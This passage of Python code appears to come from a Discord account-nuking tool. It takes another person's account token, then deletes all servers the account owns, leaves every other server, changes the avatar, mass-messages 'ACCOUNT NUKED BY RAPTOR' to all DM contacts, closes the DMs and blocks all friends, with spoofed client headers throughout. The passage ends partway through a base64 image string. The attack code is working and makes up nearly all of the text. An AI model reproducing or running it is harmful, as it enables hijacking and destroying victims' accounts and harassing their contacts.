      url = f'https://discord.com/api/v9/users/@me/guilds'
      tukan = input("What is the token that you want to delete all owned servers on?: ")

      header = {
          "authority": "discord.com",
          "scheme": "https",
          "accept": "*/*",
          "accept-encoding": "gzip, deflate, br",
          "accept-language": "en-US",
          "Authorization": f'{tukan}',
          "content-length": "0",
          "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
          "origin": "https://discord.com",
          'referer': 'https://discord.com/channels/@me',
          "sec-fetch-dest": "empty",
          "sec-fetch-mode": "cors",
          "sec-fetch-site": "same-origin",
          "user-agent": useragent(),
          "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
          "x-debug-options": "bugReporterEnabled",
          "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
      }

      r = requests.get(url, headers=header).json()

      for x in r:
          t = requests.post(f"https://discord.com/api/v9/guilds/{x['id']}/delete",headers=header,)
          if t.status_code == 204:
              print(f'Deleted {x["id"]}')
          else:
              print(f'Failed to delete {x["id"]}')
      print(Fore.MAGENTA + "Deleted all personal servers!")
      
    elif options4 in ['5','05']:
      cls()
      ctypes.windll.kernel32.SetConsoleTitleW("Leave All Servers") 
      print(f'''
{Fore.MAGENTA}  ____                             _                              
 / ___|  ___ _ ____   _____ _ __  | |    ___  __ ___   _____ _ __ 
 \___ \ / _ \ '__\ \ / / _ \ '__| | |   / _ \/ _` \ \ / / _ \ '__|
{Fore.RED}  ___) |  __/ |   \ V /  __/ |    | |__|  __/ (_| |\ V /  __/ |   
 |____/ \___|_|    \_/ \___|_|    |_____\___|\__,_| \_/ \___|_|   
                                                                  
''')
      url = 'https://discord.com/api/v9/users/@me/guilds'
      tukan = input("What is the token that you want to leave all servers with?: ")

      header = {
          "authority": "discord.com",
          "method": "DELETE",
          "path": "/api/v9/users/@me/guilds/",
          "scheme": "https",
          "accept": "*/*",
          "accept-encoding": "gzip, deflate, br",
          "accept-language": "en-US",
          "Authorization": f'{tukan}',
          "content-length": "0",
          "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
          "origin": "https://discord.com",
          'referer': 'https://discord.com/channels/@me',
          "sec-fetch-dest": "empty",
          "sec-fetch-mode": "cors",
          "sec-fetch-site": "same-origin",
          "user-agent": useragent(),
          "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
          "x-debug-options": "bugReporterEnabled",
          "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
      }

      r = requests.get(url,headers=header).json()
      for i in r:
          t = requests.delete(f'https://discord.com/api/v9/users/@me/guilds/{i["id"]}',headers=header)
          if t.status_code == 204 or 200:
              print(f"Succefully left {i['id']}")
          else:
              print(t)

    elif options4 in ['6','06']:
        cls()
        ctypes.windll.kernel32.SetConsoleTitleW("Token Destroyer")
        print(f'''
    {Fore.MAGENTA}     ___  _     _ _ _                 _        
        / _ \| |__ | (_) |_ ___ _ __ __ _| |_ ___  
       | | | | '_ \| | | __/ _ \ '__/ _` | __/ _ \   
    {Fore.RED}   | |_| | |_) | | | ||  __/ | | (_| | ||  __/ 
        \___/|_.__/|_|_|\__\___|_|  \__,_|\__\___| 
                                                                                                            
        ''')

        url = f'https://discord.com/api/v9/users/@me/guilds'
        tukan = input("What is the token that you want to destroy?: ")

        header = {
            "authority": "discord.com",
            "scheme": "https",
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US",
            "Authorization": f'{tukan}',
            "content-length": "0",
            "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
            "origin": "https://discord.com",
            'referer': 'https://discord.com/channels/@me',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36',
            "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
            "x-debug-options": "bugReporterEnabled",
            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
        }

        r = requests.get(url, headers=header).json()

        for x in r:
            t = requests.post(f"https://discord.com/api/v9/guilds/{x['id']}/delete",headers=header,)
            if t.status_code == 204 or 200:
                print(f'Deleted {x["id"]}')
            else:              
              for i in r:
                  e = requests.delete(f'https://discord.com/api/v9/users/@me/guilds/{i["id"]}',headers=header)
                  if e.status_code == 200 or 204:
                      print(f'Left {i["id"]}')
                  else:
                      print(e)

        print(Fore.MAGENTA + "Deleted all personal servers!")
        print(Fore.MAGENTA + "Left all servers!")
        
        url3 =  "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAoHCBUVFRgVEhUYGBgYEhIYGBIYEhgYGBISGBgZGRgVGBgcIS4lHB4rHxgYJjgmKy8xNTU1GiU7QDs0Py40NTEBDAwMEA8QGhISGjQhJCE0NDE0NDQ0NDQ0NDQxNDQ0NDQxMTQxMTQ0NDQ0NDQxNDQ0NDQ0NDE1MTE0NDQxNDQ0Mf/AABEIAKYBLwMBIgACEQEDEQH/xAAcAAACAgMBAQAAAAAAAAAAAAADBAIFAAEGBwj/xAA5EAACAgEDAgMHAgQGAQUAAAABAgARAwQhMRJBBVFhBhMiMnGBkaHBQrHw8RRSYoLR4SMHM1Nyov/EABkBAQEBAQEBAAAAAAAAAAAAAAABAgMEBf/EACERAQEBAQACAgIDAQAAAAAAAAABAhEDIRIxQVEEIjIT/9oADAMBAAIRAxEAPwCi07S20plZp0lvo8c7vnLbSiXmlErdJilvp0irFhhjmMRbCsdxrOddsi44ZZBVhFEzXWRKZU3UyGmqkSskZq4KiViOsTvHiZR+0vi2DBjYZc64mdGCMaLA1QZVPNGWMWdByLK/X67FhF5XRAeOpqJ+g5M8jy+2WrshdS7E3/l4NjYVKPUq7PbMSWAPVe7H6/j8zXWf+PfuvUtX7a6cGsaZMnFFU6RZ7fFv96MqF9u7fpfCAvmuQlh6UVonjynH6dRj3sBqNPyF87Pb/uJnI7P0oOp2bo6gQfeFqUKK5sn73Ha1PDn9PX9NqkyoMmM9SnvVEHuCDwZphBezXhRwaZEa+ojrcNyrsB1LyRsdtua+8ZdN50l9PFqSavECBFs2QCNukTyYrM0yrs+Y8RbIlxrU4qaAdbhVc+HkwKbGP5FFStZ6MNQx7wAwibmJqLNxvEIBnTykEQxjHjuGGOEKhDCBIwEkWWVC5WDdIyyyBSFBGKTRIQLMYQCYAOoRnNR4i2NSY1gx+cjNVmlW50Ggxym0Q4l7o3mHRdaROJb6dIjoekiWuICSt5g+NY0ixZDGsbTFdoOokxIq0lMusbmTU3DTUypkT8T1ww42cgnpUmhV0BufoO8Mk/ajxM6bTZMqi2VT02LAY7AkdwJ89a7UvqXd8jl3Kkl2NkAD9APIbATtPaL2hfOvTks9b7kUFVAekgAbk9JPPF+s5dMA0odmYM560xqosc/Ob77CvvflNScJ7VyaVygxuQqDIHIPTYdh0XY+LjtxCvqFA+EgEXTE89IsX6neLajrNuWPVyNzYr15J43jXsZ7Pf4/MyM5RETrdgLYgsAFW9gd+T5StWc91U5c7ZCVQX1dI6QLJaxQXvZIAAHnU9H9jPY4YVGfUAHIRjfGAzKcPLENVW24B5HI876jwv2Y0umo4sQ6wbGRvicHpKkgn5bBOwobyxcyyPL5PN2cyXyQDJGWimoy9M3HmobLvFMrUYTJqe8RfMWO80gOoYMb4lXn1QU7S0z1RlE+MsdhCxHJkLnaDGmMstJo+5jGTCBxC9VuLBGlSpJMRuEYASo0H8oUERXI9QQcmA6cogmcRYXJKsgNcGzzGEzGl/vKqSGFC+UnjxiEoXvxCNJtGUMCqf2h1xyJVPpckutNknNabNLjTZpHR1egy1LnBlnH6bUGXOk1XmZmwl46JMkYTJKVNUIzi1QmLHWaXiPJh5Upqo1izXM2Os0sAZkGjyXVI6dTnm/t94p1ZVwcBSD1fFRsXVed8Gtv5eiNkAFkgAcknYCeJ+0mvLZc+Surqd0QrZodTC1B3r+K/WXKWqHU5LcIAKFKrngt1k2a7Amq3qzzI6hlZ3dlLOSQGbhOOB2Jo/rEkbZUU7sxvz2IC2316iSN9hC6nV79BPG3UOG7H7cy1uAZ2sn+XaLLqGxktjd0JHSWRmVipolSVINWBt6TeRyTt3iuUHvBVvofa3V4T8Gd2Xf4MjHIDtt81kb77ESxz/8AqFqiKAxC6HUuNgw+WzuxH+b9Iv4N7FanOA5ARDwzggkeYXkzodP/AOnaD/3MxPoqV+pMf2cta8fffHPv7e6gBOgLa4wjM56/eMCD7wrQpjR8x8RnV+xvv82n95qGJ63YpfPu9h9aLBqvtULh9iNEtdSO1Hhsho+hrtOlRVACqAAAAABQAGwAHYTWZe9rh5N4s5mEcmkFbRDUaUiXTiBbEDzOnXnUP+FvmFXRDsJaZdKDuJtKHaUV3+BI9IF8Mt9S+2wlNrHIgK5mA7xdsw7wecFoAptvCoZMwuYmS5pdNZjC4wIVPGv9pK5pSAIu2TeAfqmw2+0CsIsBhYZIBIzjNQg+MRpBF8YjWIDvCOFwtLTT5qlHhcxzFkMjov8ABqqlhg1c5zE8sNO8yOiw6omP4s85/A9R7Fmg6vseeNYtXUoEzRhM8nGpp0SeISf+OlEmWEVyQSOAN27KPMntJxqaprx7xMJp8jFeu06Ql11F/hA/Jnj3izLSort0Inx+SsGPVS1vvt33/M7T2j8S6Cjo6OoIAxt8qsOq8nqRtQb19a8412Qu1FrtizNe7VxZ78k/iZrvjN/LXXQL1RJIQXuB/XfzJMr8zb/1t6Qz5L3PlSj0l/7F+z66l2fNviQ0VuveZCLCWNwBsT9h3iOmtTM7WvZP2Vy6n/yOzJh/zAkHJRoqnpzvx9Z32g9ntLpzaYlLA37x7d7+rXX2lxjCqAqgKqgBVAoKo2AA7CQy47m5Hj35LpE6kGRd5BsdcQXT5yuImZwBvIY84kGw3uYPo8pYlMu+0H12JqidpL3ZqURoec2EEr8nUGomPYsVjmADUuB3lFrnJ4j+sUqd4hkYtsBKQkiNCnBcYTTt5QqIRyIXoGPD0jeB1BH8MY1WSV7NZ5gDbqmIkJUKid4VD3dcwqY4VU8xCqkqIDGO0PjTzksaQ+Ne5kS1iLGcf5g1EKPSB5tjMZQxTGY0hmHQ5haPYHldjjmETQtsWWN4mlTiEsdM0nA+rQ3vVTd3RQKss6qBzySaHFSSoEHVkBAIdWYFbxsKAUi+oOSQQK7G+0odZrsSKp92rumP3fvGRSekHq+WqHxFjY8/WYunXHj77rsXwBEJLWCop1rZz2QN82xFE0Nu91K/xOshpsgAAUDGQQGZL+I9IHSTbE/tORyeOPk+Zye4F/k7f1xJal26C7vSnYclshHIX/TvuxmbXeYkKe0WdUBRHXI9nqcUVCkkBVsWSANz67TleugT6EfmWOs1F3Qq/X/qVDj9JHSTiBeuZ6j4Dj9xgRBsa6n9cjbt/wAfYTznwXo9+nvBa9dtfoCRfpdT0r3k6YjzfyNfUWCZmO9xlNQ3ErcLwvWRvN8eVYlwOTAu/VxEvfk7frCI/kY4nTXQZNVqCRjCO4G5gELAcyK5AxoGU+t1gO1xnQ6pFXneOB1sC3ZkMmfpHwiV2u8To12gk8SQxwR1KPkMY0vh9bmMaXOnJjObWoo2IgL5go52qVWozXsIXWa1W2lecguUkZlwkxUYTHvfzasPKFKrhjKYoZBcIFhOl1SGRO0IqQirUCCJCKskFhOmBBVhVUzapJqkMvK8cYRoBYdBMO5rE8ewtEMSxxDU0ixwmWL5ExY+vIVLFSyYyxBtWHxuK+Tnbvt2lZg1gwochHU5IVENbX1HrIPNdBr1H0lNqMrO1vbE31E7kgW3J+/6TGtfh28Xj77rovEdaznCm6glsjAbWxvmuSRXfzlDm3RxZvrO32q/wD+ZZu1shNgnEBdfKQQCB9Af0lTkSute92P6/rmYtenM9AeH6frdAzULv/6gWWP4B/SOeJa73j9C0FUV6Ig4WVvhWU9TksB04+mzwvWwHV9gDE82tABXHsO718THuZKo2syWfh4HrKw5LJr+8hlz2KH9hIonnxEgmjUb8gZ6L7P6j3mmxueQvST5lD03+k84ykfKOe+/6T0v2ew1pcSd+ksf9zFv5ETePtw/kc+MGOeu8Fm8Q8oy2jBmJ4USdxtOrxtaPKzRscxjDpVQSv1OdVJ3hFkdSBKbxLxnssR1ni2xAlO+ouFmTeTWkwmm15B3lYN4VMZhriy1Or6osmUzXuofHpr4hE01DdjGVZmG9yK6bpjSJtCFwkKmmviFx4qj2LFCdJLpTDppj2lliwSboBArRiqFXHCkwqGAJMfaSCRiSau0gXCTOiF6ZsLAiBDADtIhZILA8lRYwiwISEQmTjoYTaFx2xA8yB/3F1fzj2iALfZa+pdV/kTFvISdvDnigRH6EB+FKJvdshA2JrYD08h6yjzswU3zdX382lprXByvvfxZLFkbX5/cyo8Sc9H45Nm/P7/tOL3ZnD+l1nVsfmViQfMev2k9Uwbcd+1Sj0j0QfyfKWTttvttcNt+D6VGTIjUWORSfVVFgfkmC1ePfpVAO1KBx9v+IrlUlt7HTvf+r6/pF8+ZjsXY/wC7avUHiEPJpMd1koDe+rb/AIqJa4IGrGortRJ6hxam6PB2ijsEWz34HFwenzk2r7hiKrlG7Ff02gY+MEFlr1q/1B3Bnd6DxJHQe7bZVUFeCu1bj9+JyS6VlUturoSjrV7H5Sw8j5/USKh8dZcYIX/MFJRvMHsPUS5tjnvM3Pt6RpNWvncsMGtBO9TjfCNamRbBph8yXup/cSzbKZ2nt4dZubyn/FNdZpTt6Sg1DGNpR5En7m+BKkUb4WM0mn85eHSGR/wnnC9V64h5RrDgj2DSjvHkRRwIS1XY9JcsNPoq3jOHGIwEuGekcmICax4ye0sV0w7mFRAIUriwV2jmHTQmwmzqKkBCgUbnmJajIDsJvLkLcmRGPueO8CCqP67zZAmgsmogbVZMf0ZsN6D6zdQIgSXMwit/5SK5xddJgFVZIMOJp7rbaL9bL2v17wPL0xHzkhjfzmY40hh0KjG0Ij9I3NXkxj7dVn+Ua6LgPEcfSiX/ABOx+y9O/wCsmvpvxzuolqAepieWY9XOwvc7cf8AcrNcT019/X8fiW+clnyqDVOw4G536STt/OVGvFDf8Tg9sKaZ9gPqb9B/X6R5M3SCxok/Kv8AlUcSu0WMs3SO/wCg5MuNUMPSFXnbqPnXr9ZqRNXhVD1WSb/aotqR0jqrtZ+v1/EutB4ddMD0r+SfpD+LaRfcuQLPSNzuekEE15TXxv25Xyz5ccS7FjZ+w7AeUsvZ/D1Z09Lb8AmINOi9ktISWyHgAqvqTz/XrM5nbHTya5i1d5tFbK61fyuvZ8Z7HzI5H3m9Lofdufd/I99SEfK1bEHuO1fTyjqrD4p25Hg+d5xxnimqXFqR7sKlMocgUCbPUK4+Vq+065ccrPHvDEGmaxbIxydfcu7fGzehvjtQ8o57L6j3uAde7ISjHz6QKP4I/Bkz6tjpuzWZqfj0bTBvtLHBp1reCb4eIB8zcTTgZ1LovG5iTOTIsSZJE84G8caxCBVIRWgp1GqT98ImGJhEXvAbGUTfXFahFEBhieDNKkkGuSqQbC0JIttUj9ZorAwzAJHoM2BAkJsTQk6gZ0mYq+YklhVWBoD0hBjEkohFmVeOYmjSNFcUZWabM4fiIA5PaK+O6gP8A/gCkeQ4B/Y/Y+UsMdIjORuQQu3A7n+U5ViS/Xfysf8AsX5UePrOe728d/Dn8rfrJyGtg+O7G12L/wCRK7xJt6PYVHdTmTrxkAj4bAAG43Isjjfb7St8RJL+uwvsWoX+sxx6IFjRwp6dix59PK+3eG0GgyM46l22s+nncvdLoWU8rWy8XsBV/Xb9Y/lCotkgbGtrJP0E6Sftw35PxPbEWgAOAK+kj4gf/Dkv/wCN/wCRnP6rVZerqVzxwpIUDyIHJ+sVy+K52RkYggiiSosjvxL8oxPFrsqposwUckgD6k0J6XotIuNFReFUD6nufuZ5smM3amiNxWxBG+x7GOYvFNQvy5n/ANz9XPo1zGbx18ubqSSvRemK59aiuuMn4mHUFAukHLMeFGx3PlOUxe02oAIJRiRsxWivrQoSnOtfqLB2DGwWDEEgm66rur7cTd1+nLPgv5dV4v4k2X/w4Sj9RGykuWKkEWR8AXYE3f0q5deB6Y4cfQ7AuzM7t/rarF9+OZ5pkyM27Ek3yTZv6mdT7NeNliuHKSSdkc99vkb15o/aTOvftryeOzPI7Rcl9vPfzkSLi4JFV2kkfznR5EykyoVT5yVCE6AQYREhlUQiAQdRVIUGYKEmtGFbTY8QgHkOJoj1mwK73IJKYTpmlcTfVAl0SbrVbg7f0INOfiuvSbCWdoG7E3tM6KhAsCKrcKi9u0xRJCBnRJBZsCVvtB4i2nx9aAE3wTyJlVkEkqnDeF+2TvnVcldLGgg7X5mWPintcmNiqi/9VxxeOBxtH9JjLsqjkkD6esrMbS202qTCnWd2YEAD+FfP7xbyNzPaH43nHyKSFQEX6XufrxKPdz5bgeVgd/I16xvLjfIbF/c0PTbvG9P4fSnqO9Gq7EzEza9PyzmFBql8tlAH0AFCpX6nMOq/IA8+Xl6y402lAUghfiKEsRZ32IUHtv8AkSl12NUZlA/hFEk3d7XMunTWp1z5AKZwS1EgkLXkamO/UPn3HCgEcyCqVQCthd8Hfuf5iaF1TL9TXY977QzyT6NaZCw271fUd6/vt+JDUaYAHpYmxsF37XXHEJ4dkHuxTUQWtiCe+3bvv+IXU6gBPmPUDffgg8b+snV4qswRQKVjY+YtXxbjitxF2Pl3524+0hmO1gd9zf4/eTwEMxv4R09r5A/eVUQwF2TzsB/z2gyy1x/u/aGTpptgSSKvsO8GmK92JA/b+v5x0RQXt+fpCdK0RRP1P/AhTmQfDjQAD+Ii2Y+p/biQBFUB9T5jt9JYV1/spri+Nlc22NqFnfoO63/+h9peGefeEa44Moax0t8LAG/h8/tz9L853fXfE65vY8fmx8dd/ZgZKkjqRVfrFQphEw3NOTGzHsZoZzDJoyZP/AGE9Ae/bzm/et5xlNAYdNBARTI/rG8GR40mlA5hlRR2gbwi+YdYHqkw0gN7z0m1eQWEEDYMksxVkcrBFLMaAFmAUGZcoNd7S4UTqDWxWwnf7+U5HXe2edvkpKPbe/rCyWvSsuoCiyeJ5Z7U+PHNkIVm6FOyk7WO4iniftHmzABmobWB3PnKVnJuxcza6Zx+221B6iQTY73InVMfO+5kUXueZsKDM+3bmf0Ph1Zve/oJa6durf8AnNzJqfTNjb6sKaIPAO3rGUzFlJXbmr/H7zJknafGEdfqvhKMLPSR1X3B5iOLTgguSTRpd97Hc/eZMnN6BM2Mqdje+13zsd/yYXUZAyMQtfEosE2QbVhXFE7zJkil9Kp93zt1EV62TcxtOGHUb+l+X9pkyUJON2FDa4XDpCaNivvflNzIDGLGEFUC1g9RiefKASOncbX1E79yJkyFgQybf1yZoZOKsfeZMlVmQ9vSdx7J5y+nAbco/RZ7gAMv4BA+0yZNZ/04eb/DoVEYx7TJk6vDUjkmLmmTIUVcsIueZMgEOSCGSZMgSDSatvU1MgGUwimZMkCviXiYwoXon0FTzjxr2jyZ2NkqvAQHb7zJklbyo2exvcWZzxMmTNd8pEzaggczJkKzCbu5IIJqZE+jX2//2Q=="
        
        payload = {
            'avatar':url3
        }

        l = requests.patch('https://discord.com/api/v9/users/@me', headers=header, json=payload)

        print(Fore.MAGENTA + "Changed Pfp!")

        url4 = 'https://discord.com/api/v9/users/@me/relationships'
        header = {
            "authority": "discord.com",
            "path": f"/api/v9/users/@me/relationships",
            "scheme": "https",
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US",
            "Authorization": f"{tukan}",
            "content-length": "0",
            "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
            "origin": "https://discord.com",
            'referer': 'https://discord.com/channels/@me',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36',
            "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
            "x-debug-options": "bugReporterEnabled",
            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
        }

        massdms = requests.get("https://discord.com/api/v9/users/@me/channels", headers=header).json()
        for user in massdms:
          payload = {
            'content':'ACCOUNT NUKED BY RAPTOR'
          }
          l = requests.post(f"https://discord.com/api/v9/channels/{user['id']}/messages",headers=header, json=payload)
          if l.status_code == 200 or 204:
            print(f'Sent Dm to {user["id"]}')
          else:
            pass
        
        print('Dmed All Users')

        closedms = requests.get("https://discord.com/api/v9/users/@me/channels", headers=header).json()
        for user in closedms:
          a = requests.delete(f"https://discord.com/api/v9/channels/{user['id']}",headers=header)
          if a.status_code == 200 or 204:
            print(f'Closed Dms With {user["id"]}')
          else:
            pass

        print(Fore.MAGENTA + 'Closed all dms')

        payload = {"type": 2}
        r = requests.get(url4, headers=header).json()

        for x in r:
            e = requests.put(f'https://discord.com/api/v9/users/@me/relationships/{x["id"]}', headers=header, json=payload)
            if e.status_code == 200 or 204:
                print(f"Successfully blocked {x['id']}")
            else:
                print(e)

        print(Fore.MAGENTA + "Blocked all friends")


        url2 = 'https://discord.com/api/v9/guilds'

        header = {
            "authority": "discord.com",
            "method": "POST",
            "path": f"/api/v9/guilds",
            "scheme": "https",
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US",
            "Authorization": f"{tukan}",
            "content-length": "0",
            "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
            "origin": "https://discord.com",
            'referer': 'https://discord.com/channels/@me',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36',
            "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
            "x-debug-options": "bugReporterEnabled",
            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
        }

        ids = []

        def servercreate():
            image = "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAoHCBUVFRgVEhUYGBgYEhIYGBIYEhgYGBISGBgZGRgVGBgcIS4lHB4rHxgYJjgmKy8xNTU1GiU7QDs0Py40NTEBDAwMEA8QGhISGjQhJCE0NDE0NDQ0NDQ0NDQxNDQ0NDQxMTQxMTQ0NDQ0NDQxNDQ0NDQ0NDE1MTE0NDQxNDQ0Mf/AABEIAKYBLwMBIgACEQEDEQH/xAAcAAACAgMBAQAAAAAAAAAAAAADBAIFAAEGBwj/xAA5EAACAgEDAgMHAgQGAQUAAAABAgARAwQhMRJBBVFhBhMiMnGBkaHBQrHw8RRSYoLR4SMHM1Nyov/EABkBAQEBAQEBAAAAAAAAAAAAAAABAgMEBf/EACERAQEBAQACAgIDAQAAAAAAAAABAhEDIRIxQVEEIjIT/9oADAMBAAIRAxEAPwCi07S20plZp0lvo8c7vnLbSiXmlErdJilvp0irFhhjmMRbCsdxrOddsi44ZZBVhFEzXWRKZU3UyGmqkSskZq4KiViOsTvHiZR+0vi2DBjYZc64mdGCMaLA1QZVPNGWMWdByLK/X67FhF5XRAeOpqJ+g5M8jy+2WrshdS7E3/l4NjYVKPUq7PbMSWAPVe7H6/j8zXWf+PfuvUtX7a6cGsaZMnFFU6RZ7fFv96MqF9u7fpfCAvmuQlh6UVonjynH6dRj3sBqNPyF87Pb/uJnI7P0oOp2bo6gQfeFqUKK5sn73Ha1PDn9PX9NqkyoMmM9SnvVEHuCDwZphBezXhRwaZEa+ojrcNyrsB1LyRsdtua+8ZdN50l9PFqSavECBFs2QCNukTyYrM0yrs+Y8RbIlxrU4qaAdbhVc+HkwKbGP5FFStZ6MNQx7wAwibmJqLNxvEIBnTykEQxjHjuGGOEKhDCBIwEkWWVC5WDdIyyyBSFBGKTRIQLMYQCYAOoRnNR4i2NSY1gx+cjNVmlW50Ggxym0Q4l7o3mHRdaROJb6dIjoekiWuICSt5g+NY0ixZDGsbTFdoOokxIq0lMusbmTU3DTUypkT8T1ww42cgnpUmhV0BufoO8Mk/ajxM6bTZMqi2VT02LAY7AkdwJ89a7UvqXd8jl3Kkl2NkAD9APIbATtPaL2hfOvTks9b7kUFVAekgAbk9JPPF+s5dMA0odmYM560xqosc/Ob77CvvflNScJ7VyaVygxuQqDIHIPTYdh0XY+LjtxCvqFA+EgEXTE89IsX6neLajrNuWPVyNzYr15J43jXsZ7Pf4/MyM5RETrdgLYgsAFW9gd+T5StWc91U5c7ZCVQX1dI6QLJaxQXvZIAAHnU9H9jPY4YVGfUAHIRjfGAzKcPLENVW24B5HI876jwv2Y0umo4sQ6wbGRvicHpKkgn5bBOwobyxcyyPL5PN2cyXyQDJGWimoy9M3HmobLvFMrUYTJqe8RfMWO80gOoYMb4lXn1QU7S0z1RlE+MsdhCxHJkLnaDGmMstJo+5jGTCBxC9VuLBGlSpJMRuEYASo0H8oUERXI9QQcmA6cogmcRYXJKsgNcGzzGEzGl/vKqSGFC+UnjxiEoXvxC